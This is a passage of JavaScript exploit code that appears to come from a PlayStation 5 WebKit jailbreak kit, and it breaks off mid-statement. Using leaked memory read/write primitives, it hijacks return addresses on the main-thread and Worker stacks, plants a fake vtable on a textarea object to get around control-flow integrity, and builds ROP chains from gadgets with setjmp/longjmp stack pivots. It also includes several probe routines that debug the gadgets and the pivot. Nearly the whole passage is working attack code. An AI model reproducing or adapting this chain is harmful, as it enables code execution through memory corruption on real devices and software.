    // CFI-immune: hijack a return address on our own main-thread stack. A sort
    // comparator runs with sort's native CallFrame live; the comparator's own
    // CallFrame (JSC 613: Register=8B, returnPC at +0x08, codeBlock at +0x10,
    // callee at +0x18, arg0 at +0x30) holds the return address into sort. We
    // put a distinctive JSValue marker as arg0, scan the 2MB main stack for it,
    // and verify the frame by checking callee == the comparator's own cell.
    // This step REPORTS the located returnPC only (no overwrite) so it cannot
    // crash; the pivot is wired once the locate is confirmed on device.
    if (typeof OFFSET_wk_bootstrap !== "undefined"
        && OFFSET_wk_bootstrap === "selfstack") {
        // Synchronous crash-proof logger: each step is committed to
        // localStorage BEFORE the next (a queued jbmark is lost on a
        // synchronous crash). The previous run's trail is painted on screen at
        // the top so a crashing pivot is still diagnosable on the next boot.
        const NL = String.fromCharCode(10);
        function selfLog(tag, detail) {
            const line = tag + (detail ? " " + detail : "");
            try {
                localStorage.setItem("slopself",
                    (localStorage.getItem("slopself") || "") + line + NL);
            } catch (e) {}
            try { jbmark(tag, detail); } catch (e) {}
        }
        let prevTrail = "";
        try { prevTrail = localStorage.getItem("slopself") || ""; } catch (e) {}
        try {
            let sink = document.getElementById("selfsink");
            if (!sink) {
                sink = document.createElement("pre");
                sink.id = "selfsink";
                sink.setAttribute("style",
                    "position:fixed;top:0;left:0;right:0;z-index:99999;margin:0;"
                    + "background:#000;color:#0f0;font:11px monospace;"
                    + "white-space:pre-wrap;max-height:100vh;overflow:auto;padding:4px");
                document.body.appendChild(sink);
            }
            sink.textContent = prevTrail
                ? "=== PREVIOUS SELFSTACK TRAIL (last completed line = where it died) ===" + NL
                    + prevTrail
                : "=== selfstack: no previous trail (first run) ===";
        } catch (e) {}
        try { localStorage.removeItem("slopself"); } catch (e) {}
        // let the browser PAINT the previous trail before we risk crashing.
        await new Promise(r => setTimeout(r, 120));
        selfLog("SELF-BEGIN", "fw=" + window.fw_str);

        // Enumerate every thread stack -- we do not assume which thread runs
        // our JS. (base, size) pairs from _thread_list.
        const stacks = [];
        for (let t = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
             t.low || t.hi; t = p.read8(t.add32(0x38))) {
            const sa = p.read8(t.add32(0xA8));
            const sz = p.read8(t.add32(0xB0));
            if ((sa.low || sa.hi) && sz.hi === 0 && sz.low >= 0x4000
                && sz.low <= 0x400000)
                stacks.push([sa, sz.low]);
        }
        selfLog("SELF-STACKS", "count=" + stacks.length + "-sizes="
            + stacks.map(x => "0x" + x[1].toString(16)).join(","));

        const M0 = 0x13370001, M1 = 0x13370002, TAG = 0xffff0000;
        let comparatorAddr = null;

        function inAnyStack(v) {
            for (const [b, sz] of stacks) {
                if ((v.hi >>> 0) !== (b.hi >>> 0)) continue;
                const rel = (v.low >>> 0) - (b.low >>> 0);
                if (rel >= 0 && rel < sz && (v.low & 7) === 0) return true;
            }
            return false;
        }
        // Find the live comparator CallFrame: a stack qword == comparatorAddr
        // (callee at CF+0x18) whose CF+0x00 is a stack ptr and CF+0x20 (argc) is
        // small. Returns { cf } or null.
        function findFrame() {
            const lo = comparatorAddr.low >>> 0, hi = comparatorAddr.hi >>> 0;
            const b0 = lo & 0xff, b1 = (lo >>> 8) & 0xff,
                  b2 = (lo >>> 16) & 0xff, b3 = (lo >>> 24) & 0xff;
            for (const [base, size] of stacks) {
                const view = array_from_address(base, size);
                for (let o = 0x18; o + 0x28 <= size; o += 8) {
                    if (view[o] !== b0 || view[o+1] !== b1
                        || view[o+2] !== b2 || view[o+3] !== b3) continue;
                    const slot = base.add32(o);
                    const full = p.read8(slot);
                    if (full.low !== lo || (full.hi >>> 0) !== hi) continue;
                    const cf = base.add32(o - 0x18);
                    const caller = p.read8(cf);
                    const argc = p.read8(cf.add32(0x20));
                    if (inAnyStack(caller) && (argc.low >>> 0) >= 1
                        && (argc.low >>> 0) <= 0x10)
                        return cf;
                }
            }
            return null;
        }

        const G = gadgets;
        function gaddr(n) { const g = G[n]; if (!g) throw new Error("missing gadget " + n); return g; }

        // PRE-ALLOCATE everything BEFORE the sort. Allocating inside the
        // comparator (mid-sort) triggers GC/reentrancy and faults -- that was
        // the earlier 0xa0020328. Inside the comparator we only WRITE, never
        // allocate. The chain skeleton is built now; the four cf-dependent
        // values are patched in when we trigger.
        const scratch = malloc(0x20);
        const MAGIC = new int64(0x1337c0de, 0x0defaced);
        p.write8(scratch, new int64(0, 0));
        const chainBuf = malloc(0x400);
        const chainEntry = chainBuf;
        // Isolation stack for the pivot test: pivot lands here, which just loops.
        const pivotBuf = malloc(0x20);
        p.write8(pivotBuf, gaddr("infloop"));

        // slot indices into chainBuf that get patched at trigger time
        const S_RETSLOT = 6, S_ORIGRET = 8, S_CBSLOT = 11, S_ORIGCB = 13,
              S_FINAL_RETSLOT = 18;
        let ci = 0;
        const put = (v) => { p.write8(chainBuf.add32(ci * 8), v); ci++; };
        // 1) MAGIC -> scratch
        put(gaddr("pop rdi")); put(scratch);              // 0,1
        put(gaddr("pop rax")); put(MAGIC);                // 2,3
        put(gaddr("mov [rdi], rax"));                     // 4
        // 2) restore CF+0x08 := origRet   (retSlot / origRet patched in later)
        put(gaddr("pop rdi")); put(new int64(0, 0));      // 5,6  <- S_RETSLOT
        put(gaddr("pop rax")); put(new int64(0, 0));      // 7,8  <- S_ORIGRET
        put(gaddr("mov [rdi], rax"));                     // 9
        // 3) restore CF+0x10 := origCB    (cbSlot / origCB patched in later)
        put(gaddr("pop rdi")); put(new int64(0, 0));      // 10,11 <- S_CBSLOT
        put(gaddr("pop rax")); put(new int64(0, 0));      // 12,13 <- S_ORIGCB
        put(gaddr("mov [rdi], rax"));                     // 14
        // 4) comparator return value = boxed int 0 ("equal")
        put(gaddr("pop rax")); put(new int64(0x00000000, 0xffff0000)); // 15,16
        // 5) clean return: rsp := retSlot ; ret pops origRet (now restored)
        put(gaddr("pop rsp")); put(new int64(0, 0));      // 17,18 <- S_FINAL_RETSLOT

        let done = false, calls = 0, armed = false, origRet = null, origCB = null;
        const comparator = function (a, b) {
            calls++;
            // Only hijack once we are ARMED (i.e. during the real sort). The
            // warmup below calls this directly many times with armed=false to
            // force BASELINE JIT -- so its epilogue is a native `ret` that
            // leaves rsp = CF+0x10 (LLInt's software op_ret does not, which is
            // why the earlier pivot crashed).
            if (done || !armed) return (a >>> 0) - (b >>> 0);
            const cf = findFrame();
            if (!cf) return (a >>> 0) - (b >>> 0);
            done = true;
            const retSlot = cf.add32(0x08);
            const cbSlot = cf.add32(0x10);
            origRet = p.read8(retSlot);
            origCB = p.read8(cbSlot);

            // Patch the cf-dependent values into the pre-built chain (writes only)
            p.write8(chainBuf.add32(S_RETSLOT * 8), retSlot);
            p.write8(chainBuf.add32(S_ORIGRET * 8), origRet);
            p.write8(chainBuf.add32(S_CBSLOT * 8), cbSlot);
            p.write8(chainBuf.add32(S_ORIGCB * 8), origCB);
            p.write8(chainBuf.add32(S_FINAL_RETSLOT * 8), retSlot);

            const cbLooksHeap = (origCB.hi >>> 0) >= 0x8 && (origCB.hi >>> 0) <= 0x9ff;
            selfLog("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
                + "-retSlot=0x" + retSlot.toString()
                + "-chainEntry=0x" + chainEntry.toString()
                + "-origRet=0x" + origRet.toString()
                + "-origCB=0x" + origCB.toString()
                + "-cbLooksHeap=" + cbLooksHeap);

            // Full pivot: CF+0x10 = chainEntry, CF+0x08 = pop rsp. On the JS
            // return, the BASELINE native ret pops CF+0x08 -> pop rsp -> rsp =
            // [CF+0x10] = chainEntry -> chain writes MAGIC, restores both slots,
            // returns cleanly into sort.
            p.write8(cbSlot, chainEntry);
            p.write8(retSlot, gaddr("pop rsp"));
            selfLog("SELF-PIVOT-FIRED", "baseline pivot armed; returning now");
            return 0;
        };
        comparatorAddr = p.leakval(comparator);
        nogc.push(comparator);
        selfLog("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());

        // Warm up with direct JS->JS calls (these count toward tier-up, unlike
        // host-boundary sort calls). ~600 hits baseline JIT without going DFG.
        let warmSink = 0;
        for (let k = 0; k < 600; k++) warmSink += comparator(k & 0xffff, (k + 1) & 0xffff);
        selfLog("SELF-WARMUP", "calls=" + calls + "-sink=" + warmSink
            + "-(should now be baseline-JIT)");

        // Now arm and run a SMALL sort so only a few extra (baseline) calls
        // happen -- the first hijacks the frame.
        armed = true;
        const arr = [M0, M1, M0, M1, M0, M1, M0, M1];
        arr.sort(comparator);

        const got = p.read8(scratch);
        selfLog("SELF-PIVOT-RESULT", "armed=" + done + "-calls=" + calls
            + "-scratch=0x" + got.toString()
            + "-magicMatch=" + (got.low === MAGIC.low && got.hi === MAGIC.hi));
        if (!(got.low === MAGIC.low && got.hi === MAGIC.hi))
            throw new Error("selfstack pivot: chain did not run / magic not "
                + "written (armed=" + done + ", calls=" + calls + "). If the page "
                + "survived, the comparator epilogue was not a native ret off "
                + "CF+0x08 -- warm up harder or find the native return slot.");
        selfLog("SELF-PIVOT-OK", "RIP CONTROL on the main thread via self-stack "
            + "return hijack -- chain ran and returned cleanly (magic=0x"
            + got.toString() + ")");
        throw new Error("selfstack PIVOT OK: CFI-immune RIP control achieved on "
            + "the main thread. Next: run the real payload chain / spawn host thread.");
    }

    // -----------------------------------------------------------------------
    // 7.00 bootstrap milestone (OFFSET_wk_bootstrap === "fakevtable").
    //
    // The idle-Worker hijack that every other profile uses cannot work here:
    // on JSC 613 the Worker does not park at a return address any scan can find
    // (its blocking primitive is a raw syscall, and the PLT is `jmp [GOT]`, so
    // nothing that resumes it does so through a stack `ret` we can overwrite).
    //
    // Replacement plan: fake a C++ vtable on the leaked textarea's impl object
    // and let a virtual dispatch hand us `rdi = this` = a known address. That
    // is enough for `longjmp(this)` to pivot into a ROP chain, and later to
    // spawn a dedicated host thread (rop.js thread_rop) so nothing idle is ever
    // hijacked again.
    //
    // This block is ONLY the first, non-destructive verification: point every
    // fake vtable slot at setjmp and find which JS/DOM operation actually
    // performs a controllable virtual call. setjmp ignores its args and just
    // saves registers, so a hit rewrites impl[0..0x48] into a jmp_buf whose
    // +0x00 is a WebKit text address and +0x10 is a stack address -- a
    // signature we can read back. That same call captures the return context
    // the full launcher needs, so a positive result unblocks the rest.
    if (typeof OFFSET_wk_bootstrap !== "undefined"
        && OFFSET_wk_bootstrap === "fakevtable") {
        const SETJMP = libSceLibcInternalBase.add32(OFFSET_lc_setjmp);
        const impl = textAreaVtPtr;              // C++ HTMLTextAreaElement*
        const realVtable = textAreaVtable;       // its genuine vtable
        const N = 64;                            // slots to shadow

        // Build a fake vtable: copy N real entries, then overwrite them all
        // with setjmp. Any virtual that fires lands on setjmp.
        const fakeVtable = malloc(0x8 * (N + 2));
        for (let i = 0; i < N; i++)
            p.write8(fakeVtable.add32(i * 8), p.read8(realVtable.add32(i * 8)));

        const SIG_LO = SETJMP; // (unused sentinel; kept for symmetry)

        function looksLikeJmpBuf() {
            const rip = p.read8(impl);                    // impl[0x00]
            const rsp = p.read8(impl.add32(0x10));        // impl[0x10]
            const ripInWk = rip.sub32(libSceNKWebKitBase);
            const wkOk = ripInWk.hi === 0 && (ripInWk.low >>> 0) < 0x3673d22
                && (ripInWk.low >>> 0) > 0x1000;
            // a stack pointer on PS5 is a high canonical userland address
            const stackOk = (rsp.hi >>> 0) >= 0x7 && (rsp.hi >>> 0) <= 0x8ff
                && (rsp.low & 0xf) === 0;
            return { wkOk, stackOk, rip, rsp };
        }

        // Preserve the impl object's first 0x48 bytes; setjmp overwrites them
        // (rdi = impl), so we restore between trials to keep the textarea usable.
        const implSave = [];
        for (let i = 0; i < 9; i++) implSave.push(p.read8(impl.add32(i * 8)));
        function restoreImpl() {
            for (let i = 0; i < 9; i++) p.write8(impl.add32(i * 8), implSave[i]);
        }

        // Simpler property reads first (least likely to reach a CFI-guarded
        // polymorphic dispatch); heavier DOM ops last. Whichever op leaves a
        // jmp_buf in impl used an UNGUARDED virtual call -- that is the vector.
        const trials = [
            ["nodeName",  () => { void textArea.nodeName; }],
            ["localName", () => { void textArea.localName; }],
            ["tagName",   () => { void textArea.tagName; }],
            ["value",     () => { void textArea.value; }],
            ["type",      () => { void textArea.type; }],
            ["toString",  () => { void textArea.toString(); }],
            ["scrollTop", () => { void textArea.scrollTop; }],
            ["focus",     () => textArea.focus()],
            ["blur",      () => textArea.blur()],
            ["select",    () => textArea.select()],
            ["click",     () => textArea.click()]
        ];

        let winner = null;
        for (const [name, op] of trials) {
            // FVT-TRY is committed to the screen BEFORE the op. If the op
            // performs a CFI-GUARDED virtual call through our out-of-range fake
            // vtable, it traps (ud2 -> SIGILL) and the process dies here -- so
            // an FVT-TRY with no following FVT-RESULT names the guarded op.
            p.write8(impl, fakeVtable);
            jbmark("FVT-TRY", "op=" + name + "-impl=0x" + impl.toString()
                + "-fakevt=0x" + fakeVtable.toString());
            let threw = "";
            try { op(); } catch (e) { threw = String(e && e.message).slice(0, 60); }
            const r = looksLikeJmpBuf();
            jbmark("FVT-RESULT", "op=" + name
                + "-rip=0x" + r.rip.toString() + "-wkOk=" + r.wkOk
                + "-rsp=0x" + r.rsp.toString() + "-stackOk=" + r.stackOk
                + (threw ? "-threw=" + threw : ""));
            if (r.wkOk && r.stackOk) { winner = { name, rip: r.rip, rsp: r.rsp }; break; }
            restoreImpl();
        }

        if (winner) {
            jbmark("FVT-HIT", "op=" + winner.name
                + "-savedRip=0x" + winner.rip.toString()
                + "-savedRsp=0x" + winner.rsp.toString()
                + "  <== controllable virtual call; set OFFSET_wk_vtable_trigger to this op");
            throw new Error("bootstrap milestone: fake-vtable virtual call CONFIRMED via '"
                + winner.name + "'. Next step: wire the longjmp launcher.");
        }
        restoreImpl();
        jbmark("FVT-DONE", "no-op-produced-a-clean-virtual-call"
            + "-all-either-noop-or-CFI-guarded");
        throw new Error("bootstrap milestone: no trial produced a controllable "
            + "virtual call (all no-op or CFI-guarded). Pivot to a CFI-immune "
            + "primitive (jmp_buf / return-address).");
    }

    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker(SLOPKIT_DIR + "rop_slave.js");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    crumb("fw");
    let worker_stacks = find_worker(p, libKernelBase);
    let worker_stack = worker_stacks[0];
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-candidates=" + worker_stacks.length
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stacks, libKernelBase);
    } else {
        // Backward-compatible path for original profiles without a saved-PC fingerprint.
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    crumb("rs" + (window.__wwrPicked !== undefined
        ? "/rva0x" + window.__wwrPicked.toString(16) : ""));
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {

        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    let launchNo = 0;
    async function launch_chain(chain) {
        /* prepare() is now getting through, so failures have moved into the
           stages that follow -- and every launch used to write the same four
           crumbs, making "died-after=pm" useless once there were twenty of
           them. Tag each launch with its ordinal and the chain's length: the
           pair identifies which call died and how big it was. */
        const tag = "#" + (++launchNo) + "/" + chain.count;

        /* Re-validate the return slot before EVERY launch.
           -------------------------------------------------------------------
           return_address_ptr is found once, during prepare, and then reused for
           every launch afterwards. That assumes the worker re-parks at exactly
           the same stack depth each time it goes back to sleep, which is not
           guaranteed: the wake path can leave a different amount of stack in
           use, and then the slot we overwrite is no longer a live return
           address -- it is somebody's local variable.
           This is the only mechanism that can explain a result that FLIPS:
           every gadget and syscall stub in this profile has now been verified
           byte-for-byte against the devkit binary, so a gadget cannot pass in
           one run and crash the chain in the next. Something dynamic must, and
           a stale slot is dynamic.
           So check the slot still holds the saved PC we expect, and re-scan if
           it does not. 512 reads per launch is nothing next to a crash. */
        if (typeof OFFSET_lk_worker_wait_return !== "undefined"
            && window.__wwrPicked !== undefined) {
            const want = libKernelBase.add32(window.__wwrPicked);
            const cur = p.read8(return_address_ptr);
            if (cur.low !== want.low || cur.hi !== want.hi) {
                crumb("reslot" + tag);
                jbmark("WORKER-RESLOT", "slot 0x" + return_address_ptr.toString()
                    + " held 0x" + cur.toString() + ", expected 0x" + want.toString()
                    + " -- the worker re-parked elsewhere; rescanning");
                let found = null;
                for (const st of worker_stacks) {
                    for (let o = 0x7F000; o < 0x80000; o += 8) {
                        const c = st.add32(o), v = p.read8(c);
                        if (v.low === want.low && v.hi === want.hi) {
                            if (found) { found = null; break; }   // ambiguous
                            found = c;
                        }
                    }
                    if (found) break;
                }
                if (!found)
                    throw new Error("the worker's saved return PC (lk+0x"
                        + window.__wwrPicked.toString(16) + ") is no longer on any"
                        + " candidate stack -- it is not parked where we can reach"
                        + " it, and arming the old slot would corrupt live data.");
                return_address_ptr = found;
                stack_pointer_ptr = found.add32(0x8);
                original_return_address = p.read8(return_address_ptr);
                jbmark("WORKER-RESLOT-OK", "relocated to 0x" + found.toString());
            }
        }

        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        if (PROBE === "p" || PROBE === "g1" || PROBE === "g2") {
            /* Sub-bisect of the three write gadgets. Nothing can be read back
               (a wrong gadget crashes rather than writing), so each run is a
               pure crash/silent answer -- but each also tests ARITY, which is
               the likeliest fault: a `pop rdi ; pop rbp ; ret` consumes two
               stack slots instead of one, swallows the next chain entry and
               returns into whatever follows. Putting infloop immediately after
               the popped value detects exactly that: one slot => we park,
               two slots => infloop is eaten and control lands on garbage.

                 p  : pop rdi, V, pop rsi, V, infloop   (both pops, no store)
                 g1 : pop rdi, V, infloop               (pop rdi alone)
                 g2 : pop rsi, V, infloop               (pop rsi alone)          */
            const stk = malloc(0x200);
            const V = new int64(0x41414141, 0x00004141);
            let i = 0;
            const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
            if (PROBE === "p" || PROBE === "g1") { put(gadgets["pop rdi"]); put(V); }
            if (PROBE === "p" || PROBE === "g2") { put(gadgets["pop rsi"]); put(V); }
            put(gadgets["infloop"]);

            crumb("probe-" + PROBE + "-w1");
            p.write8(return_address_ptr, gadgets["pop rsp"]);
            p.write8(stack_pointer_ptr, stk);
            crumb("probe-" + PROBE + "-armed");
            jbmark("PROBE-WAIT", "probe=" + PROBE + " armed -- a few seconds, do NOT reload");
            const ans = await new Promise((resolve) => {
                const t = setTimeout(() => resolve(false), 4000);
                worker.onmessage = function () { clearTimeout(t); resolve(true); };
                crumb("probe-" + PROBE + "-pm");
                worker.postMessage(0);
            });
            crumb("probe-" + PROBE + "-" + (ans ? "ANSWERED" : "SILENT"));
            const names = { p: "pop rdi AND pop rsi", g1: "pop rdi", g2: "pop rsi" };
            throw new Error("probe=" + PROBE + ": worker "
                + (ans ? "ANSWERED" : "went SILENT without crashing")
                + " -- " + names[PROBE] + " "
                + (ans ? "did not take the pivot" : "consume exactly one stack"
                    + " slot each and return correctly")
                + ". Worker is spinning; reload.");
        }

        if (PROBE === "w") {
            /* probe=sj crashed, and it is probe=rsp (which works) plus two
               things: the write gadgets and setjmp. Run ONLY the writes and
               park. Silent => the three gadgets are fine and setjmp is the
               culprit. Crash => one of pop rdi / pop rsi / mov [rdi],rsi is
               wrong, and the value left in scratch says how far it got. */
            const scratch = malloc(0x40);
            const stk = malloc(0x200);
            const MAGIC = new int64(0x13371337, 0x0BADF00D);
            p.write8(scratch, new int64(0, 0));
            let i = 0;
            const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
            const viaRax = (typeof OFFSET_wk_store_via_rax !== "undefined")
                && OFFSET_wk_store_via_rax;
            put(gadgets["pop rdi"]); put(scratch);
            if (viaRax) { put(gadgets["pop rax"]); put(MAGIC); put(gadgets["mov [rdi], rax"]); }
            else { put(gadgets["pop rsi"]); put(MAGIC); put(gadgets["mov [rdi], rsi"]); }
            put(gadgets["infloop"]);

            crumb("probe-w-w1");
            p.write8(return_address_ptr, gadgets["pop rsp"]);
            p.write8(stack_pointer_ptr, stk);
            crumb("probe-w-armed");
            jbmark("PROBE-WAIT", "probe=w armed -- about a second, do NOT reload");
            const ans = await new Promise((resolve) => {
                let done = false;
                const finish = (v) => { if (!done) { done = true; resolve(v); } };
                worker.onmessage = function () { finish(true); };
                crumb("probe-w-pm");
                worker.postMessage(0);
                let n = 0;
                const iv = setInterval(() => {
                    const v = p.read8(scratch);
                    if ((v.low === MAGIC.low && v.hi === MAGIC.hi) || ++n > 30) {
                        clearInterval(iv); finish(false);
                    }
                }, 100);
            });
            const got = p.read8(scratch);
            const wroteOK = got.low === MAGIC.low && got.hi === MAGIC.hi;
            crumb("probe-w-" + (ans ? "ANSWERED" : "SILENT") + (wroteOK ? "-wOK" : "-wBAD"));
            jbmark("PROBE-W", "write=" + (wroteOK ? "ok" : "FAILED")
                + "-scratch=0x" + got.toString());
            throw new Error("probe=w: the three write gadgets "
                + (wroteOK
                    ? "WORK -- scratch holds MAGIC, so pop rdi (0x"
                    + wk_gadgetmap["pop rdi"].toString(16) + "), pop rsi (0x"
                    + wk_gadgetmap["pop rsi"].toString(16) + ") and mov [rdi],rsi"
                    + " (0x" + wk_gadgetmap["mov [rdi], rsi"].toString(16)
                    + ") are all correct. By elimination setjmp (libc+0x"
                    + OFFSET_lc_setjmp.toString(16) + ") is what kills the chain."
                    : "FAILED -- scratch = 0x" + got.toString() + " instead of"
                    + " MAGIC, so one of pop rdi / pop rsi / mov [rdi],rsi is not"
                    + " the instruction the profile claims")
                + ". Worker is spinning; reload.");
        }

        if (PROBE === "sj") {
            /* Everything up to and including the stack switch is proven, and a
               parked worker lets us read memory back afterwards -- so run the
               remaining pieces for real and INSPECT the result instead of
               inferring it from a crash.

               chain: write MAGIC through the same gadgets the restore-writes
               use, call setjmp on a buffer we own, then park in infloop.
               Afterwards scratch tells us whether pop rdi / pop rsi /
               mov [rdi],rsi work, and the jmp_buf dump tells us whether
               OFFSET_lc_setjmp is really setjmp and whether the profile's
               "+0x00 rip, +0x10 rsp" layout claim actually holds -- which is
               exactly what longjmp depends on. */
            const sjbuf = malloc(0x100);
            const scratch = malloc(0x40);
            const stk = malloc(0x200);
            const MAGIC = new int64(0x13371337, 0x0BADF00D);
            for (let z = 0; z < 0x100; z += 8) p.write8(sjbuf.add32(z), new int64(0, 0));
            p.write8(scratch, new int64(0, 0));

            let i = 0;
            const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
            // SysV: the slot holding a called address must be 16-byte aligned,
            // so that rsp % 16 == 8 on entry. Same rule rop.js's fcall applies.
            const align = () => { if ((stk.low + i * 8) & 8) put(gadgets["ret"]); };
            const viaRax2 = (typeof OFFSET_wk_store_via_rax !== "undefined")
                && OFFSET_wk_store_via_rax;
            put(gadgets["pop rdi"]); put(scratch);
            if (viaRax2) { put(gadgets["pop rax"]); put(MAGIC); put(gadgets["mov [rdi], rax"]); }
            else { put(gadgets["pop rsi"]); put(MAGIC); put(gadgets["mov [rdi], rsi"]); }
            put(gadgets["pop rdi"]); put(sjbuf);
            align();
            put(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
            put(gadgets["infloop"]);

            crumb("probe-sj-w1");
            p.write8(return_address_ptr, gadgets["pop rsp"]);
            p.write8(stack_pointer_ptr, stk);
            crumb("probe-sj-armed");
            jbmark("PROBE-WAIT", "probe=sj armed -- parking the worker and"
                + " reading memory back; this takes about a second, do NOT reload");
            const ans = await new Promise((resolve) => {
                let done = false;
                const finish = (v) => { if (!done) { done = true; resolve(v); } };
                worker.onmessage = function () { finish(true); };
                crumb("probe-sj-pm");
                worker.postMessage(0);
                // The chain writes MAGIC before it parks, so poll for it: the
                // answer arrives in milliseconds and no long deadline is needed.
                let n = 0;
                const iv = setInterval(() => {
                    const v = p.read8(scratch);
                    if ((v.low === MAGIC.low && v.hi === MAGIC.hi) || ++n > 30) {
                        clearInterval(iv);
                        finish(false);
                    }
                }, 100);
            });
            const got = p.read8(scratch);
            const wroteOK = got.low === MAGIC.low && got.hi === MAGIC.hi;
            const dump = [];
            for (let z = 0; z < 0x40; z += 8)
                dump.push("+0x" + z.toString(16) + "=0x" + p.read8(sjbuf.add32(z)).toString());
            crumb("probe-sj-" + (ans ? "ANSWERED" : "SILENT") + (wroteOK ? "-wOK" : "-wBAD"));
            jbmark("PROBE-SJ", "write=" + (wroteOK ? "ok" : "FAILED")
                + "-answered=" + ans + "-jmpbuf=" + dump.join(" "));
            throw new Error("probe=sj: worker " + (ans ? "ANSWERED" : "went SILENT")
                + ". write gadgets (pop rdi/pop rsi/mov [rdi],rsi): "
                + (wroteOK ? "WORK (scratch holds MAGIC)"
                    : "FAILED -- scratch = 0x" + got.toString()
                    + ", so one of those three gadgets is wrong")
                + ". jmp_buf after setjmp(libc+0x"
                + OFFSET_lc_setjmp.toString(16) + "): " + dump.join("  ")
                + "  -- [+0x00] must be a libSceNKWebKit code address (the chain"
                + " slot after setjmp) and [+0x10] must be a stack address near"
                + " 0x" + stk.toString() + " for the profile's layout claim to"
                + " hold. All zero means setjmp never ran. Worker is spinning;"
                + " reload.");
        }

        if (PROBE === "rsp") {
            /* One step past probe=pivot: use the REAL pivot gadget and switch
               to a stack we control, whose only entry is `jmp $`. That covers
               `pop rsp` and the stack switch but still touches neither setjmp
               nor longjmp nor the restore-writes. Silent => the pivot gadget
               and the switch are both sound and only the chain BODY is left. */
            const probeStack = malloc(0x40);
            p.write8(probeStack, gadgets["infloop"]);
            crumb("probe-rsp-w1");
            p.write8(return_address_ptr, gadgets["pop rsp"]);
            p.write8(stack_pointer_ptr, probeStack);
            crumb("probe-rsp-armed");
            const ans = await new Promise((resolve) => {
                const t = setTimeout(() => resolve(false), 6000);
                worker.onmessage = function () { clearTimeout(t); resolve(true); };
                crumb("probe-rsp-pm");
                worker.postMessage(0);
            });
            crumb("probe-rsp-" + (ans ? "ANSWERED" : "SILENT"));
            throw new Error("probe=rsp: worker "
                + (ans ? "ANSWERED -- `pop rsp` did not take the pivot"
                    : "went SILENT without crashing -- `pop rsp` (0x"
                    + wk_gadgetmap["pop rsp"].toString(16) + ") and the stack"
                    + " switch to 0x" + probeStack.toString() + " BOTH work."
                    + " Only setjmp/longjmp and the restore-writes remain.")
                + " Worker is spinning; reload.");
        }

        if (PROBE === "pivot") {
            /* Write a `jmp $` instead of the pivot and change nothing else.
               If the worker then goes quiet WITHOUT crashing, the hijacked
               return address is genuinely executed -- the frame, the slot and
               the wake path are all correct, and the fault is purely in what
               the chain does next. If it crashes anyway, the hijack itself is
               wrong and no amount of chain fixing will help.
               The worker is left spinning; this run ends here by design. */
            crumb("probe-pivot-w1");
            p.write8(return_address_ptr, gadgets["infloop"]);
            crumb("probe-pivot-armed");
            const answered = await new Promise((resolve) => {
                const t = setTimeout(() => resolve(false), 6000);
                worker.onmessage = function () { clearTimeout(t); resolve(true); };
                crumb("probe-pivot-pm");
                worker.postMessage(0);
            });
            crumb("probe-pivot-" + (answered ? "ANSWERED" : "SILENT"));
            throw new Error("probe=pivot: worker "
                + (answered ? "ANSWERED -- the return slot was NOT taken, the"
                    + " hijack did not land (wrong frame or the write was undone)"
                    : "went SILENT and did not crash -- the hijacked return"
                    + " address IS executed, so the pivot is sound and the fault"
                    + " is in the chain body")
                + ". The worker is now spinning in infloop; reload.");
        }

        crumb("w1" + tag);
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        crumb("w2" + tag);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);
        crumb("armed" + tag);

        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        /* A hung worker is as fatal as a crashed one and much harder to read:
           with no deadline this await never settles, so the page freezes at
           whatever it last printed and there is no crash dump either. The
           `p1 == 0` branch below was already written for this case but nothing
           could ever reach it -- resolve(0) on timeout so it can. */
        let p1 = await new Promise((resolve) => {
            const t = setTimeout(() => { crumb("pm-TIMEOUT" + tag); resolve(0); }, 10000);
            worker.onmessage = function (e) {
                clearTimeout(t);
                resolve(1);
            }
            crumb("pm" + tag);
            worker.postMessage(0);
        });
        crumb("wans" + tag);
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            /* Say WHICH chain hung and what it was made of. "The rop thread ran
               away" names the symptom and nothing else, and poops' own
               POOPS-WHY is teardown fallout -- the affinity never reads back
               BECAUSE the chain died, so reading that as the cause points at
               the wrong syscall, which it did for two rounds. What narrows it
               is the launch number, the slot count, and whether the chain's
               return slot was written before it stopped: written means the
               body ran and something after it blocked, untouched means it
               never got past the pivot. */
            let rv = "unreadable";
            try { rv = "0x" + p.read8(chain.return_value).toString(); }
            catch (e) {  }
            jbmark("CHAIN-HUNG", "launch " + tag + " name="
                + (chain.jbName || "?") + " retslot=" + rv
